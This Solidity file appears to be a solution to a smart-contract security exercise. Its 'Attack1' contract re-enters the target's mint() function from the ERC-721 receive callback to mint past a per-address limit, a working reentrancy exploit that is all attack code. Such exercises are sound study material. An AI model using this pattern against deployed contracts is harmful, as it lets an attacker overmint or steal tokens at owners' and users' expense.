// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.21;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint1} from "./Overmint1.sol";

contract Attack1 is IERC721Receiver {
    Overmint1 public overmint1;

    constructor(address _address) {
        overmint1 = Overmint1(_address);
    }

    function attack() public {
        overmint1.mint();
    }

    function onERC721Received(address, address, uint256, bytes calldata) public returns (bytes4) {
        if (overmint1.balanceOf(address(this)) < 5) {
            overmint1.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
